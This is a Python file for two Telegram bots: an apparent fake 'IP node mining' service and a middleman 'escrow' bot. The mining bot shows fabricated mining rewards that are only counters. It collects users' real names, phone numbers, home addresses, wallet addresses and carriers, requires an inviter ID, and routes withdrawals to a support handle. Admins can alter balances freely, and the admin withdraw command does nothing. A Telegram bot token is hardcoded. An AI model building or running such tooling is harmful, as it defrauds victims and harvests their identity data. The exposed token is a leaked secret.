import telebot
import time
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from collections import defaultdict
from threading import Thread

# ====================== 双机器人 Token（已全部帮你填好）======================
MINING_BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
TRUST_BOT_TOKEN  = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"

# 管理员 ID
ADMIN_IDS = [8256055083, 810821053]
ADMIN_ID = 8781082053

# ====================== 挖矿机器人数据 ======================
user_data = defaultdict(lambda: {
    "mining_approved": False,
    "boost": 0,
    "trx": 0,
    "points": 0,
    "total_withdraw_boost": 0,
    "banned": False,
    "airdrop_claimed": False,
    "mining_today_locked": False,
    "level": 1,
    "mine_count_today": 0,
    "max_mine_per_day": 20
})

user_lang = defaultdict(lambda: "zh")

COINS = ["BTC","ETH","USDT","BNB","SOL","XRP","ADA","DOGE","AVAX","MATIC","DOT","LINK"]
coin_reward = {c:100 for c in COINS}
coin_delay = {c:8 for c in COINS}
AIRDROP_REWARD = 10

LEVEL_CONFIG = {1:(8,100),2:(12,120),3:(16,150),4:(20,180),5:(25,220)}
user_last_reset_date = {}
coin_cooldown = {}

lang = {
    "zh": {
        "start_title": "IP節點挖礦系統 | 專業交易所版\n歡迎使用，請以下方按鈕操作",
        "btn_start_mine": "⛏️ 開始IP節點挖礦",
        "btn_apply_ip": "🚀 申請綁定IP節點",
        "btn_withdraw": "🔄 申請回戶作業",
        "btn_airdrop": "🧧 每日空投領取",
        "btn_asset": "👤 個人資產總覽",
        "btn_rules": "📜 項目資格說明書",
        "btn_support": "💬 線上客服專區",
        "banned": "❌ 你已被封禁，無法使用功能",
        "mine_select": "⛏️ 請選擇挖礦幣種\n選擇後開始節點驗證",
        "mine_no_perm": "❌ 請先申請並通過挖礦權限",
        "mine_locked": "❌ 今日挖礦已結束",
        "mine_max": "❌ 今日挖礦次數已達上限",
        "mining_process": "正在挖矿请等待…",
        "mine_success": "✅ 挖礦完成：{}\nLv.{} 節點\n🎉 助力值 +{}\n💎 總助力：{}",
        "apply_sent": "✅ 申請已提交，管理員將盡快審核",
        "already_approved": "✅ 你已經擁有挖礦權限",
        "withdraw_tip": "✅ 請把回戶數值+ID發送客服 @fcff88",
        "airdrop_done": "🧧 空投領取成功！積分 +{}",
        "airdrop_today_claimed": "❌ 今日空投已領",
        "asset_title": "👤 個人資產總覽",
        "level": "等級：Lv.{}",
        "mine_today": "今日挖礦：{}/{}",
        "boost": "💎 助力值：{}",
        "trx_balance": "🪙 TRX：{}",
        "mine_status": "✅ 挖礦權限：{}",
        "points": "📊 積分：{}",
        "total_withdraw": "📈 累計回戶：{}",
        "status_on": "已開通",
        "status_off": "待開通",
        "status_running": "🟢 正常",
        "status_stopped": "🔴 暫停",
        "support_msg": "✅ 聯繫客服 @fcff88",
        "lang_switched": "✅ 語言切換成功",
        "project_rules_text": "📜 項目資格說明書\n1. 本系統為IP節點挖礦，僅限授權用戶使用\n2. 每日挖礦次數依等級設有上限\n3. 助力值可用於兌換與提現\n4. 嚴禁作弊、惡意刷號，違規封禁\n5. 平台保留最終解釋權",
        "approved_notify": "✅ 恭喜！你的挖礦申請已通過，可開始挖礦",
        "calc_title": "💎 助力值兌換結算",
        "calc_boost": "💰 您的助力值：{}",
        "calc_rate": "📌 兌換匯率：10 = 0.12 USDT",
        "calc_total": "✅ 可兌換：{:.2f} USDT",
        "apply_invite_empty": "❌ 邀請人UID為必填項，請重新填寫",
        "apply_complete": "✅ 資料已提交，請等待管理員審核",
        "apply_template": """📝 請直接複製下方模板填寫後回傳
真實姓名：
聯繫手機：
居住地址：
錢包地址：
邀請人UID：
網絡運營商：
範例：
真實姓名：陳家偉
聯繫手機：59123456
居住地址：香港九龍旺角亞皆老街123號
錢包地址：TYQ56789abcdefghijKLmnopqRstuvWxyz
邀請人UID：98765432
網絡運營商：CSL Mobile
⚠️ 邀請人UID為必填項，不可填無"""
    },
    "en": {
        "start_title": "IP Node Mining System\nWelcome! Use the buttons below.",
        "btn_start_mine": "⛏️ Start Mining",
        "btn_apply_ip": "🚀 Apply Access",
        "btn_withdraw": "🔄 Withdraw",
        "btn_airdrop": "🧧 Daily Airdrop",
        "btn_asset": "👤 Assets",
        "btn_rules": "📜 Rules",
        "btn_support": "💬 Support",
        "banned": "❌ You are banned.",
        "mine_select": "⛏️ Select Coin",
        "mine_no_perm": "❌ Please apply for mining access first.",
        "mine_locked": "❌ Mining closed today.",
        "mine_max": "❌ Daily limit reached.",
        "mining_process": "Mining...",
        "mine_success": "✅ Mined: {}\nLv.{} Node\n🎉 Boost +{}\n💎 Total: {}",
        "apply_sent": "✅ Application sent, admin will review soon.",
        "already_approved": "✅ You already have mining access.",
        "withdraw_tip": "✅ Contact support @fcff88",
        "airdrop_done": "🧧 Airdrop claimed! Points +{}",
        "airdrop_today_claimed": "❌ Already claimed today.",
        "asset_title": "👤 Assets Overview",
        "level": "Level: Lv.{}",
        "mine_today": "Today Mined: {}/{}",
        "boost": "💎 Boost: {}",
        "trx_balance": "🪙 TRX: {}",
        "mine_status": "✅ Mining Status: {}",
        "points": "📊 Points: {}",
        "total_withdraw": "📈 Total Withdraw: {}",
        "status_on": "Approved",
        "status_off": "Pending",
        "status_running": "🟢 Active",
        "status_stopped": "🔴 Stopped",
        "support_msg": "✅ Support @fcff88",
        "lang_switched": "✅ Language switched",
        "project_rules_text": "📜 Rules\n1. Only authorized users\n2. Daily mining limits\n3. Boost can be exchanged/withdrawn\n4. Cheating will be banned\n5. Platform reserves all rights",
        "approved_notify": "✅ Your mining access is approved!",
        "calc_title": "💎 Boost Calculation",
        "calc_boost": "💰 Your Boost: {}",
        "calc_rate": "📌 Rate: 10 = 0.12 USDT",
        "calc_total": "✅ Total: {:.2f} USDT",
        "apply_invite_empty": "❌ Inviter UID is required",
        "apply_complete": "✅ Application submitted successfully",
        "apply_template": """📝 Please copy the template below and reply
Full Name:
Contact Phone:
Residential Address:
Wallet Address:
Inviter UID:
Network Operator:
Example:
Full Name: Chan Ka Wai
Contact Phone: 59123456
Residential Address: 123 Argyle Street, Mong Kok, Kowloon, Hong Kong
Wallet Address: TYQ56789abcdefghijKLmnopqRstuvWxyz
Inviter UID: 98765432
Network Operator: CSL Mobile
⚠️ Inviter UID is required, cannot be filled as None"""
    }
}

def t(uid, key):
    return lang[user_lang[uid]][key]

def is_admin(uid):
    return uid in ADMIN_IDS

# ====================== 挖矿机器人 ======================
mining_bot = telebot.TeleBot(MINING_BOT_TOKEN)

def show_main_menu(chat_id, uid):
    if user_data[uid]["banned"]:
        mining_bot.send_message(chat_id, t(uid, "banned"))
        return
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(
        InlineKeyboardButton(t(uid, "btn_start_mine"), callback_data="start_mining"),
        InlineKeyboardButton(t(uid, "btn_apply_ip"), callback_data="apply_mining"),
        InlineKeyboardButton(t(uid, "btn_withdraw"), callback_data="apply_withdraw"),
        InlineKeyboardButton(t(uid, "btn_airdrop"), callback_data="daily_airdrop"),
        InlineKeyboardButton(t(uid, "btn_asset"), callback_data="asset_overview"),
        InlineKeyboardButton(t(uid, "btn_rules"), callback_data="project_rules"),
        InlineKeyboardButton(t(uid, "btn_support"), callback_data="support")
    )
    mining_bot.send_message(chat_id, t(uid, "start_title"), reply_markup=mk)

@mining_bot.message_handler(commands=['start'])
def cmd_start(msg):
    show_main_menu(msg.chat.id, msg.from_user.id)

@mining_bot.message_handler(commands=['lang'])
def cmd_lang(msg):
    uid = msg.from_user.id
    user_lang[uid] = "en" if user_lang[uid] == "zh" else "zh"
    mining_bot.send_message(msg.chat.id, t(uid, "lang_switched"))
    show_main_menu(msg.chat.id, uid)

@mining_bot.callback_query_handler(func=lambda c: c.data == "start_mining")
def cb_start_mining(call):
    uid = call.from_user.id
    u = user_data[uid]
    if u["banned"]:
        mining_bot.answer_callback_query(call.id, t(uid, "banned"), show_alert=True)
        return
    if not u["mining_approved"]:
        mining_bot.answer_callback_query(call.id, t(uid, "mine_no_perm"), show_alert=True)
        return
    if u["mining_today_locked"]:
        mining_bot.answer_callback_query(call.id, t(uid, "mine_locked"), show_alert=True)
        return
    if u["mine_count_today"] >= u["max_mine_per_day"]:
        mining_bot.answer_callback_query(call.id, t(uid, "mine_max"), show_alert=True)
        return
    mk = InlineKeyboardMarkup(row_width=3)
    btns = [InlineKeyboardButton(c, callback_data=f"mine_{c}") for c in COINS]
    mk.add(*btns)
    mining_bot.edit_message_text(t(uid, "mine_select"), call.message.chat.id, call.message.id, reply_markup=mk)
    mining_bot.answer_callback_query(call.id)

@mining_bot.callback_query_handler(func=lambda c: c.data.startswith("mine_"))
def cb_mine(call):
    uid = call.from_user.id
    u = user_data[uid]
    chat_id = call.message.chat.id
    today = datetime.now().strftime("%Y-%m-%d")
    if uid not in user_last_reset_date or user_last_reset_date[uid] != today:
        u["mine_count_today"] = 0
        user_last_reset_date[uid] = today
    coin = call.data.split("_")[1]
    cooldown_key = f"{uid}_{coin}"
    now = time.time()
    if cooldown_key in coin_cooldown and coin_cooldown[cooldown_key] > now:
        mining_bot.answer_callback_query(call.id, f"{coin} cooling {int(coin_cooldown[cooldown_key]-now)}s", show_alert=True)
        return
    coin_cooldown[cooldown_key] = now + 60
    if u["banned"] or not u["mining_approved"] or u["mining_today_locked"]:
        mining_bot.answer_callback_query(call.id)
        return
    if u["mine_count_today"] >= u["max_mine_per_day"]:
        mining_bot.answer_callback_query(call.id, t(uid, "mine_max"), show_alert=True)
        return
    lvl = u["level"]
    reward = coin_reward.get(coin, 100)
    delay = coin_delay.get(coin, 8)
    mining_bot.answer_callback_query(call.id, t(uid, "mining_process"), show_alert=True)
    time.sleep(delay)
    u["boost"] += reward
    u["mine_count_today"] += 1
    mining_bot.send_message(chat_id, t(uid, "mine_success").format(coin, lvl, reward, u["boost"]))
    show_main_menu(chat_id, uid)

@mining_bot.callback_query_handler(func=lambda c: c.data == "apply_mining")
def cb_apply(call):
    uid = call.from_user.id
    if user_data[uid]["banned"]:
        mining_bot.answer_callback_query(call.id)
        return
    if user_data[uid]["mining_approved"]:
        mining_bot.answer_callback_query(call.id, t(uid, "already_approved"), show_alert=True)
        return
    mining_bot.send_message(call.message.chat.id, t(uid, "apply_template"))
    mining_bot.answer_callback_query(call.id)

@mining_bot.message_handler(func=lambda msg: ("真實姓名：" in msg.text or "Full Name:" in msg.text))
def handle_apply(msg):
    uid = msg.from_user.id
    text = msg.text.strip()
    lines = text.splitlines()
    data = {}
    for line in lines:
        line = line.strip()
        if "真實姓名：" in line:
            data["name"] = line.replace("真實姓名：", "").strip()
        elif "Full Name:" in line:
            data["name"] = line.replace("Full Name:", "").strip()
        elif "聯繫手機：" in line:
            data["contact"] = line.replace("聯繫手機：", "").strip()
        elif "Contact Phone:" in line:
            data["contact"] = line.replace("Contact Phone:", "").strip()
        elif "居住地址：" in line:
            data["address"] = line.replace("居住地址：", "").strip()
        elif "Residential Address:" in line:
            data["address"] = line.replace("Residential Address:", "").strip()
        elif "錢包地址：" in line:
            data["wallet"] = line.replace("錢包地址：", "").strip()
        elif "Wallet Address:" in line:
            data["wallet"] = line.replace("Wallet Address:", "").strip()
        elif "邀請人UID：" in line:
            data["invite"] = line.replace("邀請人UID：", "").strip()
        elif "Inviter UID:" in line:
            data["invite"] = line.replace("Inviter UID:", "").strip()
        elif "網絡運營商：" in line:
            data["network"] = line.replace("網絡運營商：", "").strip()
        elif "Network Operator:" in line:
            data["network"] = line.replace("Network Operator:", "").strip()
    if not data.get("invite") or data["invite"] in ["", "无", "無", "0", "None"]:
        mining_bot.send_message(msg.chat.id, t(uid, "apply_invite_empty"))
        return
    admin_msg = f"""🔔 新挖礦申請
用戶ID: {uid}
姓名: {data.get('name','-')}
聯繫: {data.get('contact','-')}
地址: {data.get('address','-')}
錢包: {data.get('wallet','-')}
邀請人: {data.get('invite','-')}
網絡: {data.get('network','-')}

/agree {uid}
/refuse {uid}"""
    for admin_id in ADMIN_IDS:
        try:
            mining_bot.send_message(admin_id, admin_msg)
        except:
            pass
    mining_bot.send_message(msg.chat.id, t(uid, "apply_complete"))

@mining_bot.callback_query_handler(func=lambda c: c.data == "apply_withdraw")
def cb_withdraw(call):
    uid = call.from_user.id
    mining_bot.send_message(call.message.chat.id, t(uid, "withdraw_tip"))
    mining_bot.answer_callback_query(call.id)

@mining_bot.callback_query_handler(func=lambda c: c.data == "daily_airdrop")
def cb_airdrop(call):
    uid = call.from_user.id
    u = user_data[uid]
    if u["banned"]:
        mining_bot.answer_callback_query(call.id)
        return
    if u["airdrop_claimed"]:
        mining_bot.answer_callback_query(call.id, t(uid, "airdrop_today_claimed"), show_alert=True)
        return
    u["airdrop_claimed"] = True
    u["points"] += AIRDROP_REWARD
    mining_bot.send_message(call.message.chat.id, t(uid, "airdrop_done").format(AIRDROP_REWARD))
    mining_bot.answer_callback_query(call.id)

@mining_bot.callback_query_handler(func=lambda c: c.data == "asset_overview")
def cb_asset(call):
    uid = call.from_user.id
    u = user_data[uid]
    s_ap = t(uid, "status_on") if u["mining_approved"] else t(uid, "status_off")
    s_lock = t(uid, "status_stopped") if u["mining_today_locked"] else t(uid, "status_running")
    txt = (
        f"{t(uid, 'asset_title')}\n"
        f"{t(uid, 'level').format(u['level'])}\n"
        f"{t(uid, 'mine_today').format(u['mine_count_today'], u['max_mine_per_day'])}\n"
        f"{t(uid, 'boost')}{u['boost']}\n"
        f"{t(uid, 'trx_balance')}{u['trx']}\n"
        f"{t(uid, 'mine_status')}{s_ap} ({s_lock})\n"
        f"{t(uid, 'points')}{u['points']}\n"
        f"{t(uid, 'total_withdraw')}{u['total_withdraw_boost']}"
    )
    mining_bot.send_message(call.message.chat.id, txt)
    mining_bot.answer_callback_query(call.id)

@mining_bot.callback_query_handler(func=lambda c: c.data == "project_rules")
def cb_rules(call):
    uid = call.from_user.id
    mining_bot.send_message(call.message.chat.id, t(uid, "project_rules_text"))
    mining_bot.answer_callback_query(call.id)

@mining_bot.callback_query_handler(func=lambda c: c.data == "support")
def cb_support(call):
    uid = call.from_user.id
    mining_bot.send_message(call.message.chat.id, t(uid, "support_msg"))
    mining_bot.answer_callback_query(call.id)

@mining_bot.message_handler(commands=['agree'])
def cmd_agree(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid = msg.text.split()
        uid = int(uid)
        user_data[uid]["mining_approved"] = True
        mining_bot.send_message(msg.chat.id, f"✅ Approved {uid}")
        mining_bot.send_message(uid, t(uid, "approved_notify"))
    except:
        mining_bot.send_message(msg.chat.id, "Usage: /agree UID")

@mining_bot.message_handler(commands=['refuse'])
def cmd_refuse(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid = msg.text.split()
        user_data[int(uid)]["mining_approved"] = False
        mining_bot.send_message(msg.chat.id, f"❌ Refused {uid}")
    except:
        mining_bot.send_message(msg.chat.id, "Usage: /refuse UID")

@mining_bot.message_handler(commands=['miners'])
def cmd_miners(msg):
    if not is_admin(msg.from_user.id):
        return
    lines = []
    for uid, d in user_data.items():
        ap = "Approved" if d["mining_approved"] else "Pending"
        ban = "BANNED" if d["banned"] else ""
        lines.append(f"ID:{uid} Lv{d['level']} B:{d['boost']} TRX:{d['trx']} {ap} {ban}")
    mining_bot.send_message(msg.chat.id, "\n".join(lines[:20]))

@mining_bot.message_handler(commands=['ban'])
def cmd_ban(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid = msg.text.split()
        user_data[int(uid)]["banned"] = True
        mining_bot.send_message(msg.chat.id, f"❌ Banned {uid}")
    except:
        mining_bot.send_message(msg.chat.id, "/ban UID")

@mining_bot.message_handler(commands=['unban'])
def cmd_unban(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid = msg.text.split()
        user_data[int(uid)]["banned"] = False
        mining_bot.send_message(msg.chat.id, f"✅ Unbanned {uid}")
    except:
        mining_bot.send_message(msg.chat.id, "/unban UID")

@mining_bot.message_handler(commands=['add_trx'])
def cmd_addtrx(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid, v = msg.text.split()
        user_data[int(uid)]["trx"] += float(v)
        mining_bot.send_message(msg.chat.id, f"✅ +{v} TRX")
    except:
        mining_bot.send_message(msg.chat.id, "/add_trx UID amount")

@mining_bot.message_handler(commands=['reduce_trx'])
def cmd_rtrx(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid, v = msg.text.split()
        user_data[int(uid)]["trx"] = max(0, user_data[int(uid)]["trx"] - float(v))
        mining_bot.send_message(msg.chat.id, f"✅ -{v} TRX")
    except:
        mining_bot.send_message(msg.chat.id, "/reduce_trx UID amount")

@mining_bot.message_handler(commands=['setlevel'])
def cmd_lvl(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid, v = msg.text.split()
        user_data[int(uid)]["level"] = int(v)
        mining_bot.send_message(msg.chat.id, f"✅ Lv{v}")
    except:
        mining_bot.send_message(msg.chat.id, "/setlevel UID level")

@mining_bot.message_handler(commands=['stop_mining'])
def cmd_stop(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid = msg.text.split()
        user_data[int(uid)]["mining_today_locked"] = True
        mining_bot.send_message(msg.chat.id, "✅ Stopped")
    except:
        mining_bot.send_message(msg.chat.id, "/stop_mining UID")

@mining_bot.message_handler(commands=['resume_mining'])
def cmd_resume(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid = msg.text.split()
        user_data[int(uid)]["mining_today_locked"] = False
        mining_bot.send_message(msg.chat.id, "✅ Resumed")
    except:
        mining_bot.send_message(msg.chat.id, "/resume_mining UID")

@mining_bot.message_handler(commands=['reduce_boost'])
def cmd_rboost(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid, v = msg.text.split()
        target_uid = int(uid)
        v = int(v)
        u = user_data[target_uid]
        u["boost"] = max(0, u["boost"] - v)
        u["total_withdraw_boost"] += v
        mining_bot.send_message(msg.chat.id, f"✅ -{v} boost")
        try:
            mining_bot.send_message(target_uid, f"🔔 系統扣除助力值：{v}\n剩餘：{u['boost']}")
        except:
            pass
    except:
        mining_bot.send_message(msg.chat.id, "/reduce_boost UID val")

@mining_bot.message_handler(commands=['reduce_point'])
def cmd_rpoint(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid, v = msg.text.split()
        target_uid = int(uid)
        v = int(v)
        u = user_data[target_uid]
        u["points"] = max(0, u["points"] - v)
        mining_bot.send_message(msg.chat.id, f"✅ 扣除 {uid} 积分：{v}")
        try:
            mining_bot.send_message(target_uid, f"🔔 系統扣除積分：{v}\n剩餘：{u['points']}")
        except:
            pass
    except:
        mining_bot.send_message(msg.chat.id, "/reduce_point UID amount")

@mining_bot.message_handler(commands=['withdraw'])
def cmd_withdraw(msg):
    if not is_admin(msg.from_user.id):
        return
    mining_bot.send_message(msg.chat.id, "✅ Withdraw processed")

@mining_bot.message_handler(commands=['setminetimes'])
def cmd_setmines(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid, t = msg.text.split()
        user_data[int(uid)]["max_mine_per_day"] = int(t)
        mining_bot.send_message(msg.chat.id, f"✅ 每日上限：{t}")
    except:
        mining_bot.send_message(msg.chat.id, "/setminetimes UID times")

@mining_bot.message_handler(commands=['set_reward'])
def cmd_setreward(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, coin, v = msg.text.split()
        coin = coin.upper()
        if coin in coin_reward:
            coin_reward[coin] = int(v)
            mining_bot.send_message(msg.chat.id, f"✅ {coin} = {v}")
        else:
            mining_bot.send_message(msg.chat.id, "❌ Coin not found")
    except:
        mining_bot.send_message(msg.chat.id, "/set_reward BTC 200")

@mining_bot.message_handler(commands=['set_delay'])
def cmd_setdelay(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, coin, sec = msg.text.split()
        coin = coin.upper()
        sec = int(sec)
        if coin in coin_delay:
            coin_delay[coin] = sec
            mining_bot.send_message(msg.chat.id, f"✅ {sec}s delay set for {coin}")
        else:
            mining_bot.send_message(msg.chat.id, "❌ Coin not found")
    except:
        mining_bot.send_message(msg.chat.id, "/set_delay BTC 10")

@mining_bot.message_handler(commands=['set_airdrop'])
def cmd_set_airdrop(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, amount = msg.text.split()
        global AIRDROP_REWARD
        AIRDROP_REWARD = int(amount)
        mining_bot.send_message(msg.chat.id, f"✅ Airdrop: {amount}")
    except:
        mining_bot.send_message(msg.chat.id, "/set_airdrop 88")

@mining_bot.message_handler(commands=['add_boost'])
def cmd_add_boost(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        _, uid, v = msg.text.split()
        target_uid = int(uid)
        v = int(v)
        u = user_data[target_uid]
        u["boost"] += v
        mining_bot.send_message(msg.chat.id, f"✅ +{v} boost to {target_uid}")
        try:
            mining_bot.send_message(target_uid, f"🔔 系統增加助力值：{v}")
        except:
            pass
    except:
        mining_bot.send_message(msg.chat.id, "/add_boost UID amount")

@mining_bot.message_handler(commands=['js'])
def cmd_js(msg):
    uid = msg.from_user.id
    boost = user_data[uid]["boost"]
    usdt = boost * 0.012
    text = (
        "━━━━━━━━━━━━━━\n"
        f"{t(uid, 'calc_title')}\n"
        "━━━━━━━━━━━━━━\n"
        f"{t(uid, 'calc_boost').format(boost)}\n"
        f"{t(uid, 'calc_rate')}\n"
        "━━━━━━━━━━━━━━\n"
        f"{t(uid, 'calc_total').format(usdt)}\n"
        "━━━━━━━━━━━━━━"
    )
    mining_bot.send_message(msg.chat.id, text)

# ====================== 担保机器人 ======================
trust_bot = telebot.TeleBot(TRUST_BOT_TOKEN)

middlemen = defaultdict(lambda: {"wallet":0,"is_active":False,"username":"","total_earned":0})
orders = defaultdict(dict)
order_id = 1000
GUARANTEE_FEE = 10
PROFIT_RATE = 0.02

def new_order_id():
    global order_id
    order_id += 1
    return order_id

@trust_bot.message_handler(commands=['start'])
def trust_start(msg):
    mk = InlineKeyboardMarkup()
    mk.add(InlineKeyboardButton("申请成为中间人", callback_data="bind_middleman"))
    mk.add(InlineKeyboardButton("我的钱包", callback_data="my_wallet"))
    mk.add(InlineKeyboardButton("发起担保订单", callback_data="create_order"))
    mk.add(InlineKeyboardButton("查看帮助", callback_data="trust_help"))
    trust_bot.send_message(msg.chat.id, "🛡️ 欢迎使用TrustEscrow Pro担保机器人\n\n✅ 安全担保交易\n✅ 中间人助力值系统\n✅ 订单全程托管\n\n请选择操作：", reply_markup=mk)

@trust_bot.message_handler(commands=['bind'])
def bind_middleman(msg):
    uid = msg.from_user.id
    if middlemen[uid]["is_active"]:
        trust_bot.send_message(msg.chat.id, "⚠️ 你已经是中间人了！")
        return
    middlemen[uid]["is_active"] = True
    middlemen[uid]["username"] = msg.from_user.username or "无"
    trust_bot.send_message(msg.chat.id, "✅ 申请成功！你已成为中间人")

@trust_bot.message_handler(commands=['my'])
def my_wallet(msg):
    uid = msg.from_user.id
    data = middlemen[uid]
    if not data["is_active"]:
        trust_bot.send_message(msg.chat.id, "⚠️ 你还不是中间人，请先 /bind")
        return
    trust_bot.send_message(msg.chat.id, f"💼 中间人钱包\n余额：{data['wallet']} USDT\n累计收益：{data['total_earned']} USDT")

@trust_bot.message_handler(commands=['order'])
def create_order(msg):
    oid = new_order_id()
    orders[oid] = {
        "buyer_id": msg.from_user.id,
        "seller_id": None,
        "middleman_id": None,
        "amount": 0,
        "status": "pending"
    }
    trust_bot.send_message(msg.chat.id, f"✅ 订单创建成功：{oid}")

@trust_bot.message_handler(commands=['pai'])
def assign_order(msg):
    if msg.from_user.id not in ADMIN_IDS:
        trust_bot.send_message(msg.chat.id, "⚠️ 无权限")
        return
    try:
        _, oid, mid = msg.text.split()
        oid = int(oid)
        mid = int(mid)
        if oid not in orders:
            trust_bot.send_message(msg.chat.id, "❌ 订单不存在")
            return
        if not middlemen[mid]["is_active"]:
            trust_bot.send_message(msg.chat.id, "❌ 不是中间人")
            return
        orders[oid]["middleman_id"] = mid
        orders[oid]["status"] = "in_progress"
        trust_bot.send_message(msg.chat.id, f"✅ 订单 {oid} 已派给 {mid}")
        trust_bot.send_message(mid, f"📢 你有新订单：{oid}")
    except:
        trust_bot.send_message(msg.chat.id, "用法：/pai 订单号 中间人ID")

@trust_bot.message_handler(commands=['finish'])
def finish_order(msg):
    if msg.from_user.id not in ADMIN_IDS:
        trust_bot.send_message(msg.chat.id, "⚠️ 无权限")
        return
    try:
        _, oid = msg.text.split()
        oid = int(oid)
        if oid not in orders or orders[oid]["status"] != "in_progress":
            trust_bot.send_message(msg.chat.id, "❌ 订单异常")
            return
        mid = orders[oid]["middleman_id"]
        amt = orders[oid]["amount"]
        profit = amt * PROFIT_RATE
        middlemen[mid]["wallet"] += profit
        middlemen[mid]["total_earned"] += profit
        orders[oid]["status"] = "finished"
        trust_bot.send_message(msg.chat.id, f"✅ 订单 {oid} 已结算，利润：{profit:.2f} USDT")
        trust_bot.send_message(mid, f"💰 订单 {oid} 结算完成，收益：{profit:.2f} USDT")
    except:
        trust_bot.send_message(msg.chat.id, "用法：/finish 订单号")

@trust_bot.message_handler(commands=['list'])
def list_middlemen(msg):
    if msg.from_user.id not in ADMIN_IDS:
        trust_bot.send_message(msg.chat.id, "⚠️ 无权限")
        return
    txt = "📋 中间人列表\n"
    for uid, d in middlemen.items():
        if d["is_active"]:
            txt += f"ID:{uid} | {d['username']} | 余额:{d['wallet']}\n"
    trust_bot.send_message(msg.chat.id, txt)

@trust_bot.message_handler(commands=['help'])
def trust_help(msg):
    help_txt = """
📖 担保机器人指令
/start - 主菜单
/bind - 申请中间人
/my - 我的钱包
/order - 创建订单
/pai 订单号 中间人ID - 派单(管理)
/finish 订单号 - 结算(管理)
/list - 中间人列表(管理)
"""
    trust_bot.send_message(msg.chat.id, help_txt)

# ====================== 双机器人同时启动 ======================
if __name__ == "__main__":
    mining_thread = Thread(target=mining_bot.infinity_polling)
    trust_thread  = Thread(target=trust_bot.infinity_polling)
    mining_thread.start()
    trust_thread.start()
    mining_thread.join()
    trust_thread.join()
